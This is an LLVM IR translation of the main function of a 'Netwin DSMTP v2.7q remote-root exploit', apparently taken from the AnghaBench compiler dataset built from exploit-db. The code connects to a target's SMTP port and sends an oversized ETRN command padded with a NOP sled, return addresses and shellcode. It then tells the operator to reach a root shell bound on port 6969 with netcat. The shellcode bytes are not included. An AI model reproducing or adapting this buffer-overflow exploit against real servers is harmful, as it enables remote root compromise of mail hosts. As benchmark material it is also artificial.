; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19983.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19983.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32, i32 }
%struct.sockaddr = type { i32 }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [20 x i8] c"%s <host> [offset]\0A\00", align 1
@.str.1 = private unnamed_addr constant [48 x i8] c"Netwin DSMTP v2.7q remote-root exploit by noir\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@.str.3 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@.str.4 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@STDOUT_FILENO = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [40 x i8] c"check for portshell 6969/tcp when done\0A\00", align 1
@NOP = common dso_local global i32 0, align 4
@ALIGN = common dso_local global i32 0, align 4
@RET_MDK70 = common dso_local global i32 0, align 4
@shellcode = common dso_local global i8* null, align 8
@.str.6 = private unnamed_addr constant [6 x i8] c"ETRN \00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"\0D\0A\00\00", align 1
@.str.8 = private unnamed_addr constant [20 x i8] c"done!\0A$ nc %s 6969\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [860 x i8], align 16
  %11 = alloca [200 x i8], align 16
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %12, align 4
  %14 = load i32, i32* %4, align 4
  %15 = icmp slt i32 %14, 2
  br i1 %15, label %16, label %23

16:                                               ; preds = %2
  %17 = load i32, i32* @stderr, align 4
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i32, i8*, ...) @fprintf(i32 %17, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str, i64 0, i64 0), i8* %20)
  %22 = call i32 @exit(i32 0) #3
  unreachable

23:                                               ; preds = %2
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 2
  %26 = load i8*, i8** %25, align 8
  %27 = icmp ne i8* %26, null
  br i1 %27, label %28, label %33

28:                                               ; preds = %23
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 2
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @atoi(i8* %31)
  store i32 %32, i32* %12, align 4
  br label %33

33:                                               ; preds = %28, %23
  %34 = call i32 @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.1, i64 0, i64 0))
  %35 = load i32, i32* @AF_INET, align 4
  %36 = load i32, i32* @SOCK_STREAM, align 4
  %37 = load i32, i32* @IPPROTO_TCP, align 4
  %38 = call i32 @socket(i32 %35, i32 %36, i32 %37)
  store i32 %38, i32* %6, align 4
  %39 = icmp slt i32 %38, 0
  br i1 %39, label %40, label %43

40:                                               ; preds = %33
  %41 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  %42 = call i32 @exit(i32 -1) #3
  unreachable

43:                                               ; preds = %33
  %44 = call i32 @bzero(%struct.sockaddr_in* %13, i32 12)
  %45 = load i32, i32* @AF_INET, align 4
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  store i32 %45, i32* %46, align 4
  %47 = call i32 @htons(i32 25)
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i32 %47, i32* %48, align 4
  %49 = load i8**, i8*** %5, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 1
  %51 = load i8*, i8** %50, align 8
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  %53 = call i32 @resolv(i8* %51, i32* %52)
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %58, label %55

55:                                               ; preds = %43
  %56 = call i32 @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.3, i64 0, i64 0))
  %57 = call i32 @exit(i32 -1) #3
  unreachable

58:                                               ; preds = %43
  %59 = load i32, i32* %6, align 4
  %60 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %61 = call i64 @connect(i32 %59, %struct.sockaddr* %60, i32 12)
  %62 = icmp slt i64 %61, 0
  br i1 %62, label %63, label %66

63:                                               ; preds = %58
  %64 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0))
  %65 = call i32 @exit(i32 -1) #3
  unreachable

66:                                               ; preds = %58
  %67 = load i32, i32* %6, align 4
  %68 = getelementptr inbounds [200 x i8], [200 x i8]* %11, i64 0, i64 0
  %69 = call i32 @read(i32 %67, i8* %68, i32 1024)
  store i32 %69, i32* %7, align 4
  %70 = load i32, i32* @STDOUT_FILENO, align 4
  %71 = getelementptr inbounds [200 x i8], [200 x i8]* %11, i64 0, i64 0
  %72 = load i32, i32* %7, align 4
  %73 = call i32 (i32, ...) @write(i32 %70, i8* %71, i32 %72)
  %74 = call i32 @sleep(i32 2)
  %75 = load i32, i32* @stderr, align 4
  %76 = call i32 (i32, i8*, ...) @fprintf(i32 %75, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.5, i64 0, i64 0))
  %77 = getelementptr inbounds [860 x i8], [860 x i8]* %10, i64 0, i64 0
  %78 = load i32, i32* @NOP, align 4
  %79 = call i32 @memset(i8* %77, i32 %78, i32 860)
  %80 = load i32, i32* @ALIGN, align 4
  store i32 %80, i32* %8, align 4
  br label %81

81:                                               ; preds = %93, %66
  %82 = load i32, i32* %8, align 4
  %83 = icmp slt i32 %82, 300
  br i1 %83, label %84, label %96

84:                                               ; preds = %81
  %85 = load i32, i32* @RET_MDK70, align 4
  %86 = load i32, i32* %12, align 4
  %87 = add nsw i32 %85, %86
  %88 = sext i32 %87 to i64
  %89 = load i32, i32* %8, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds [860 x i8], [860 x i8]* %10, i64 0, i64 %90
  %92 = bitcast i8* %91 to i64*
  store i64 %88, i64* %92, align 1
  br label %93

93:                                               ; preds = %84
  %94 = load i32, i32* %8, align 4
  %95 = add nsw i32 %94, 4
  store i32 %95, i32* %8, align 4
  br label %81

96:                                               ; preds = %81
  store i32 650, i32* %8, align 4
  store i32 0, i32* %9, align 4
  br label %97

97:                                               ; preds = %111, %96
  %98 = load i32, i32* %9, align 4
  %99 = load i8*, i8** @shellcode, align 8
  %100 = call i32 @strlen(i8* %99)
  %101 = icmp slt i32 %98, %100
  br i1 %101, label %102, label %116

102:                                              ; preds = %97
  %103 = load i8*, i8** @shellcode, align 8
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8, i8* %103, i64 %105
  %107 = load i8, i8* %106, align 1
  %108 = load i32, i32* %8, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds [860 x i8], [860 x i8]* %10, i64 0, i64 %109
  store i8 %107, i8* %110, align 1
  br label %111

111:                                              ; preds = %102
  %112 = load i32, i32* %8, align 4
  %113 = add nsw i32 %112, 1
  store i32 %113, i32* %8, align 4
  %114 = load i32, i32* %9, align 4
  %115 = add nsw i32 %114, 1
  store i32 %115, i32* %9, align 4
  br label %97

116:                                              ; preds = %97
  %117 = getelementptr inbounds [860 x i8], [860 x i8]* %10, i64 0, i64 0
  %118 = call i32 @memcpy(i8* %117, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i32 5)
  %119 = getelementptr inbounds [860 x i8], [860 x i8]* %10, i64 0, i64 0
  %120 = getelementptr inbounds i8, i8* %119, i64 858
  %121 = call i32 @strcpy(i8* %120, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0))
  %122 = load i32, i32* %6, align 4
  %123 = getelementptr inbounds [860 x i8], [860 x i8]* %10, i64 0, i64 0
  %124 = getelementptr inbounds [860 x i8], [860 x i8]* %10, i64 0, i64 0
  %125 = call i32 @strlen(i8* %124)
  %126 = call i32 (i32, ...) @write(i32 %122, i8* %123, i32 %125)
  %127 = load i32, i32* @stderr, align 4
  %128 = load i8**, i8*** %5, align 8
  %129 = getelementptr inbounds i8*, i8** %128, i64 1
  %130 = load i8*, i8** %129, align 8
  %131 = call i32 (i32, i8*, ...) @fprintf(i32 %127, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.8, i64 0, i64 0), i8* %130)
  ret i32 1
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @bzero(%struct.sockaddr_in*, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @resolv(i8*, i32*) #1

declare dso_local i32 @herror(i8*) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @write(i32, ...) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
